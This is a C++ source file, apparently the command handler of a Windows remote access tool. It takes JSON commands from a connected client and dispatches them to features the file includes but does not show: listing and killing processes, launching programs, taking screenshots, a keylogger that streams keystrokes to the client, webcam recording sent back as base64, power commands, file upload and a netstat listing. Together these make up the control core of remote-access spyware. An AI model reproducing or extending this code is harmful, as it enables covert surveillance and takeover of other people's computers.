#include "CommandHandler.h"
#include <iostream>
#include <thread> 
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include "../Features/AppManager.cpp"
#include "../Features/Power.cpp"
#include "../Features/ScreenCap.cpp"
#include "../Features/Keylogger.cpp"
#include "../Features/Webcam.cpp"
#include "../Features/FileMgr.h"
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace std;
using json = nlohmann::json;

string GetTcpState(DWORD state) {
    switch (state) {
        case MIB_TCP_STATE_CLOSED: return "CLOSED";
        case MIB_TCP_STATE_LISTEN: return "LISTEN (Đang chờ)";
        case MIB_TCP_STATE_SYN_SENT: return "SYN_SENT";
        case MIB_TCP_STATE_SYN_RCVD: return "SYN_RCVD";
        case MIB_TCP_STATE_ESTAB: return "ESTABLISHED (Đang kết nối)"; // Quan trọng nhất
        case MIB_TCP_STATE_FIN_WAIT1: return "FIN_WAIT1";
        case MIB_TCP_STATE_FIN_WAIT2: return "FIN_WAIT2";
        case MIB_TCP_STATE_CLOSE_WAIT: return "CLOSE_WAIT";
        case MIB_TCP_STATE_CLOSING: return "CLOSING";
        case MIB_TCP_STATE_LAST_ACK: return "LAST_ACK";
        case MIB_TCP_STATE_TIME_WAIT: return "TIME_WAIT";
        case MIB_TCP_STATE_DELETE_TCB: return "DELETE_TCB";
        default: return "UNKNOWN";
    }
}

json GetNetStat() {
    json listArr = json::array();
    PMIB_TCPTABLE_OWNER_PID pTcpTable;
    DWORD dwSize = 0;
    GetExtendedTcpTable(NULL, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    
    pTcpTable = (PMIB_TCPTABLE_OWNER_PID)malloc(dwSize);

    if (GetExtendedTcpTable(pTcpTable, &dwSize, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
        
        for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
            MIB_TCPROW_OWNER_PID row = pTcpTable->table[i];
            
            if (row.dwState == MIB_TCP_STATE_ESTAB || row.dwState == MIB_TCP_STATE_LISTEN) {
                
                char localIp[INET_ADDRSTRLEN];
                char remoteIp[INET_ADDRSTRLEN];
                
                struct in_addr addr;
                
                addr.S_un.S_addr = row.dwLocalAddr;
                inet_ntop(AF_INET, &addr, localIp, INET_ADDRSTRLEN);
                
                addr.S_un.S_addr = row.dwRemoteAddr;
                inet_ntop(AF_INET, &addr, remoteIp, INET_ADDRSTRLEN);

                listArr.push_back({
                    {"pid", (int)row.dwOwningPid},
                    {"local", string(localIp) + ":" + to_string(ntohs((u_short)row.dwLocalPort))},
                    {"remote", string(remoteIp) + ":" + to_string(ntohs((u_short)row.dwRemotePort))},
                    {"state", GetTcpState(row.dwState)}
                });
            }
        }
    }
    
    if (pTcpTable) free(pTcpTable);
    
    return listArr;
}
void CommandHandler::Process(string jsonMessage, ServerNetwork& server) {
    try {
        if (jsonMessage.find("PING") != string::npos) {
            server.SendFrame(json{{"type", "PONG"}}.dump());
            return; 
        }
        auto req = json::parse(jsonMessage);
        string type = req["type"];

        // --- TAB 1 & 2: APPLICATIONS & PROCESSES ---
        if (type == "GET_APPS") {
            cout << ">> Client request: Get Apps List" << endl;
            json apps = AppManager::GetRunningApps();
            
            server.SendFrame(json{
                {"type", "APP_LIST"},
                {"payload", apps}
            }.dump());
        }
        
        else if (type == "PROCESS_LIST") {
            cout << ">> Client request: Get Process List" << endl;
            json procs = AppManager::GetAllProcesses();
            
            server.SendFrame(json{
                {"type", "PROCESS_LIST"},
                {"payload", procs}
            }.dump());
        }

        else if (type == "KILL_APP") {
            int pid = req["payload"]["pid"];
            cout << ">> Client request: KILL PID " << pid << endl;
            
            AppManager::KillProcess(pid);
            server.SendFrame(json{{"type", "APP_LIST"}, {"payload", AppManager::GetRunningApps()}}.dump());
            server.SendFrame(json{{"type", "PROCESS_LIST"}, {"payload", AppManager::GetAllProcesses()}}.dump());
        }
        else if (type == "START_APP") {
            string path = req["payload"]["path"];
            cout << ">> Client request: START " << path << endl;
            AppManager::StartApp(path);
        }

        // --- TAB 3: SCREENSHOT ---
        else if (type == "CAPTURE_SCREEN") {
            cout << ">> Client request: Screenshot" << endl;
            string b64 = ScreenCapture::TakeScreenshot();
            
            server.SendFrame(json{
                {"type", "SCREENSHOT_DATA"},
                {"payload", { {"base64", b64} }}
            }.dump());
        }

        // --- TAB 4: KEYLOGGER ---
        else if (type == "KEYLOG_CONTROL") {
            string action = req["payload"]["action"];
            if (action == "START") {
                cout << ">> Keylogger: ENABLED" << endl;
                Keylogger::Start(server);
            } else {
                cout << ">> Keylogger: DISABLED" << endl;
                Keylogger::Stop();
            }
        }

        // --- TAB 5: WEBCAM ---
        else if (type == "RECORD_WEBCAM") {
            int duration = req["payload"]["duration"];
            cout << ">> Webcam: Recording for " << duration << "s..." << endl;
            
            server.SendFrame(json{
                {"type", "WEBCAM_STATUS"},
                {"payload", "PROCESSING"}
            }.dump());
            thread([&server, duration]() {
                string b64Video = WebcamMgr::RecordVideo(duration);
                
                if (!b64Video.empty()) {
                    server.SendFrame(json{
                        {"type", "WEBCAM_VIDEO"},
                        {"payload", { {"base64", b64Video} }}
                    }.dump());
                    cout << ">> Webcam: Sent video to client." << endl;
                } else {
                    cout << ">> Webcam: Error recording (Check ffmpeg.exe)" << endl;
                }
            }).detach(); 
        }

        // --- TAB 6: POWER ---
        else if (type == "SYSTEM_COMMAND") {
            string action = req["payload"]["action"];
            cout << ">> System Command: " << action << endl;
            PowerControl::Execute(action);
        }
        else if (type == "UPLOAD_FILE") {
            string fileName = req["payload"]["filename"];
            string b64Data = req["payload"]["base64"];

            cout << ">> [UPLOAD] Dang nhan file: " << fileName << "..." << endl;
            bool success = FileMgr::SaveFile(fileName, b64Data);
            json response;
            response["type"] = "UPLOAD_STATUS";
            response["payload"] = {
                {"status", success ? "SUCCESS" : "FAILED"},
                {"filename", fileName}
            };
            server.SendFrame(response.dump());
        }
        
        else if (type == "GET_NETSTAT") {
            json connections = GetNetStat();
            json response;
            response["type"] = "NETSTAT_DATA";
            response["payload"] = connections;
        
            server.SendFrame(response.dump());
            cout << ">> [NET] Da gui bang Netstat (" << connections.size() << " dong)." << endl;
        }
        else {
            cout << ">> Unknown command: " << type << endl;
        }
    }
    catch (exception& e) {
        cout << "!! JSON Processing Error: " << e.what() << endl;
    }
}